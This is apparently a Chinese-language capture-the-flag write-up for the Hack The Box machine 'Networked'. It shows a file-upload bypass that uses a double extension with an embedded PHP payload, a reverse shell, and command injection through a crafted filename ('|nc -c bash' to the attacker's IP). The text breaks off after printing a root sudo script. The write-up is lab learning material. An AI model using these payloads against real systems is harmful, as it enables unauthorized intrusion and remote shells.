# 免责声明
>本文渗透的主机经过合法授权。本文使用的工具和方法仅限学习交流使用，请不要将文中使用的工具和渗透思路用于任何非法用途，对此产生的一切后果，本人不承担任何责任，也不对造成的任何误用或损害负责。

# 服务探测

查看开启端口
```
┌──(root💀kali)-[~/htb/Networked]
└─# nmap -p- 10.10.10.146 --open
Starting Nmap 7.91 ( https://nmap.org ) at 2021-12-26 21:15 EST
Nmap scan report for 10.10.10.146
Host is up (0.29s latency).
Not shown: 65532 filtered ports, 1 closed port
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 387.26 seconds

```


查看服务详细信息
```
┌──(root💀kali)-[~/htb/Networked]
└─# nmap -sV -T4 -A -O 10.10.10.146 -p 22,80
Starting Nmap 7.91 ( https://nmap.org ) at 2021-12-26 21:27 EST
Nmap scan report for 10.10.10.146
Host is up (0.31s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 22:75:d7:a7:4f:81:a7:af:52:66:e5:27:44:b1:01:5b (RSA)
|   256 2d:63:28:fc:a2:99:c7:d4:35:b9:45:9a:4b:38:f9:c8 (ECDSA)
|_  256 73:cd:a0:5b:84:10:7d:a7:1c:7c:61:1d:f5:54:cf:c4 (ED25519)
80/tcp open  http    Apache httpd 2.4.6 ((CentOS) PHP/5.4.16)
|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.4.16
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 3.10 - 4.11 (92%), Linux 3.2 - 4.9 (92%), Linux 5.1 (92%), Crestron XPanel control system (90%), Linux 3.18 (89%), Linux 3.16 (89%), ASUS RT-N56U WAP (Linux 3.4) (87%), Linux 3.1 (87%), Linux 3.2 (87%), HP P2000 G3 NAS device (87%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops

TRACEROUTE (using port 22/tcp)
HOP RTT       ADDRESS
1   321.59 ms 10.10.14.1
2   322.21 ms 10.10.10.146

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 27.18 seconds

```

只有两个端口，显然web是主要攻击点

## 目录爆破
```
┌──(root💀kali)-[~/htb/Networked]
└─# gobuster dir -w /usr/share/wordlists/Web-Content/common.txt -u http://10.10.10.146 -t 30 --no-error 
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.10.146
[+] Method:                  GET
[+] Threads:                 30
[+] Wordlist:                /usr/share/wordlists/Web-Content/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2021/12/26 21:20:46 Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 206]
/.htaccess            (Status: 403) [Size: 211]
/.htpasswd            (Status: 403) [Size: 211]
/backup               (Status: 301) [Size: 235] [--> http://10.10.10.146/backup/]
/cgi-bin/             (Status: 403) [Size: 210]                                  
/index.php            (Status: 200) [Size: 229]                                  
/uploads              (Status: 301) [Size: 236] [--> http://10.10.10.146/uploads/]

```

首页内容
```
 Hello mate, we're building the new FaceMash!
Help by funding us and be the new Tyler&Cameron!
Join us at the pool party this Sat to get a glimpse 
```

有一行注释
> upload and gallery not yet linked 

```/backup```文件夹下有网页源代码的备份，下载下来查看
```
┌──(root💀kali)-[~/htb/Networked/backup]
└─# ls
index.php  lib.php  photos.php  upload.php

```

看来这个靶机是白盒测试，主要方向是上传，留意到apache的版本是```2.4.6```，版本比较低，存在文件解析漏洞，这个上传绕过时要综合考虑。

我们分析一下源码：

上传逻辑在```upload.php```，```lib.php```主要是各种过滤函数的实现，```photos.php```是展示页面

分析```upload.php```

```
if (!(check_file_type($_FILES["myFile"]) && filesize($_FILES['myFile']['tmp_name']) < 60000)) {
      echo '<pre>Invalid image file.</pre>';
      displayform();
    }
```

这里主要是判断，文件的```Content-Type```必须包含```image/```字样以及文件大小必须小于60000字节

```
$validext = array('.jpg', '.png', '.gif', '.jpeg');
    $valid = false;
    foreach ($validext as $vext) {

      if (substr_compare($myFile["name"], $vext, -strlen($vext)) === 0) {
        $valid = true;
      }
    }
```
这里主要是做了白名单限制，允许扩展名后缀是```'.jpg', '.png', '.gif', '.jpeg'```


```
chmod(UPLOAD_DIR . $name, 0644);
```

最后给了上传的文件可读权限


结合apache的版本，我用谷歌搜索到了[这篇文章](https://www.cnblogs.com/shley/p/14797164.html),期中提到

> Apache HTTPD 支持一个文件拥有多个后缀，并为不同后缀执行不同的指令

以及

> 如果在apache配置文件中添加了php对应的解析的话，我们上传的文件中只要包含.php，php文件就会被执行

因此，我们只需要正常上传一张图片，图片文件的名称只要是包含```xxx.php.jpg```就可以绕过上传的限制，payload写在图片内容上即可

burpsuite截断以后的payload为：

```
POST /upload.php HTTP/1.1

Host: 10.10.10.146

User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8

Accept-Language: en-US,en;q=0.5

Accept-Encoding: gzip, deflate

Content-Type: multipart/form-data; boundary=---------------------------2789699860384911690836726261

Content-Length: 55138

Origin: http://10.10.10.146

Connection: close

Referer: http://10.10.10.146/upload.php

Upgrade-Insecure-Requests: 1



-----------------------------2789699860384911690836726261

Content-Disposition: form-data; name="myFile"; filename="portal.php.jpg"

Content-Type: image/jpeg



<?php phpinfo(); ?>
```

然后去到```photos.php```页面，在网页源代码里找到图片地址，新窗口打开以后就可以打印phpinfo内容


# webshell

把上传的php playload换成revers shell，拿到立足点：

```
┌──(root💀kali)-[~/htb/Networked]
└─# nc -lnvp 4242
listening on [any] 4242 ...
connect to [10.10.14.3] from (UNKNOWN) [10.10.10.146] 49530
Linux networked.htb 3.10.0-957.21.3.el7.x86_64 #1 SMP Tue Jun 18 16:35:19 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
 07:26:56 up  4:12,  0 users,  load average: 0.00, 0.01, 0.05
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=48(apache) gid=48(apache) groups=48(apache)
sh: no job control in this shell
sh-4.2$ whoami
whoami
apache

```

apache身份无法读取user.txt，需要提权到另一个账号```guly```


```guly```下有另外两个文件，一一查看

crontab.guly
```
bash-4.2$ cat crontab.guly
cat crontab.guly
*/3 * * * * php /home/guly/check_attack.php

```

每三分钟会以guly的身份执行一次```check_attack.php```

查看```check_attack.php```内容
```
bash-4.2$ cat check_attack.php
cat check_attack.php
<?php
require '/var/www/html/lib.php';
$path = '/var/www/html/uploads/';
$logpath = '/tmp/attack.log';
$to = 'guly';
$msg= '';
$headers = "X-Mailer: check_attack.php\r\n";

$files = array();
$files = preg_grep('/^([^.])/', scandir($path));

foreach ($files as $key => $value) {
        $msg='';
  if ($value == 'index.html') {
        continue;
  }
  #echo "-------------\n";

  #print "check: $value\n";
  list ($name,$ext) = getnameCheck($value);
  $check = check_ip($name,$value);

  if (!($check[0])) {
    echo "attack!\n";
    # todo: attach file
    file_put_contents($logpath, $msg, FILE_APPEND | LOCK_EX);

    exec("rm -f $logpath");
    exec("nohup /bin/rm -f $path$value > /dev/null 2>&1 &");
    echo "rm -f $path$value\n";
    mail($to, $msg, $msg, $headers, "-F$value");
  }
}

?>

```

从上传源代码可知，上传文件的名字是由IP和扩展名组成，IP获得使用了```REMOTE_ADDR```,这个获得的是真实IP，在这部机器里拿到的就是我们vpn里的IP

假设IP是：```10.10.14.3```,上传的文件扩展是：```.jpg```,那么保存在服务器中的文件名是```10_10_14_3.jpg```


分析上面的代码

```
list ($name,$ext) = getnameCheck($value);
```

这一行主要是把文件名从uploads中拿出来，还原出一个真实的IP地址

```
$check = check_ip($name,$value);
```

上面这行检查IP是否合法，不合法的IP会进入下面的if判断

再留意这一行：
```
exec("nohup /bin/rm -f $path$value > /dev/null 2>&1 &")
```

$path的值是固定的，但是$value的值其实是我们上传的文件名，某种程度上是可以"自定义"的，只要我们能控制服务器获得的IP，也就是说这一行代码存在命令注入漏洞。

一开始我是从伪造IP的思路，但是修改了几个请求头都不能伪造我们的IP地址

后来去到```/var/www/html/uploads```，发现这个目录是可写的，这就更加简单,只需要

我们创建一个包含playload的文件名

```
bash-4.2$ touch "|nc -c bash 10.10.14.3 4242"
touch "|nc -c bash 10.10.14.3 4242"
bash-4.2$ ls
ls
10_10_14_3.jpg      127_0_0_1.png  127_0_0_3.png  index.html
10_10_14_3.php.jpg  127_0_0_2.png  127_0_0_4.png  |nc -c bash 10.10.14.3 4242

```

收到反弹shell，成功提权到```guly```

```
┌──(root💀kali)-[~/htb/Networked]
└─# nc -lnvp 4242                                                                                               1 ⨯
listening on [any] 4242 ...
connect to [10.10.14.3] from (UNKNOWN) [10.10.10.146] 49588
id
uid=1000(guly) gid=1000(guly) groups=1000(guly)
whoami
guly

```

# 提权
切换tty，查看sudo特权
```
sh-4.2$ sudo -l
sudo -l
Matching Defaults entries for guly on networked:
    !visiblepw, always_set_home, match_group_by_gid, always_query_group_plugin,
    env_reset, env_keep="COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR LS_COLORS",
    env_keep+="MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE",
    env_keep+="LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES",
    env_keep+="LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE",
    env_keep+="LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY",
    secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin

User guly may run the following commands on networked:
    (root) NOPASSWD: /usr/local/sbin/changename.sh
```

可以以root身份执行一个sh文件，查看该文件
```
sh-4.2$ cat /usr/local/sbin/changename.sh
cat /usr/local/sbin/changename.sh
#!/bin/bash -p
cat > /etc/sysconfig/network-scripts/ifcfg-guly << EoF
DEVICE=guly0
ONBOOT=no
NM_CONTROLLED=no
EoF

regexp="^[a-zA-Z0-9_\ /-]+$"

for var in NAME PROXY_METHOD BROWSER_ONLY BOOTPROTO; do
        echo "interface $var:"
        read x
        while [[ ! $x =~ $regexp ]]; do
                echo "wrong input, try again"
                echo "interface $var:"
                read x
        done
        echo $var=$x >> /etc/sysconfig/network-scripts/ifcfg-guly
done
  
/sbin/ifup guly0

```